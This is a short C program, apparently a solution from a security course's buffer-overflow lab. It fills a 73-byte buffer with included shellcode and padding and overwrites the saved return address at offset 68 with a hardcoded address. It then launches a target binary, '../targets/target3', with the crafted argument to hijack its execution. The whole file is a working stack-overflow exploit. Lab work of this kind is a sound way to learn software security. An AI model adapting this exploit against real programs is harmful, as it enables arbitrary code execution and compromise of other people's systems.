#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target3"

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];

	args[0] = TARGET;
	char exploit[73];
	int i = 0;
	for (i = 0; i < 72; i++) {
		exploit[i] = 0x01;
	}	
	strcpy(exploit, shellcode);
	for (i = 45; i < 72; i++) {
		exploit[i] = 0x01;
	}
	exploit[72] = 0x00;
	int return_add = 0x2021fe14;
	int* exploit_ret_add = (int*) (exploit + 68);
	*exploit_ret_add = return_add;
	args[1] = exploit;
	args[2] = NULL;

	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
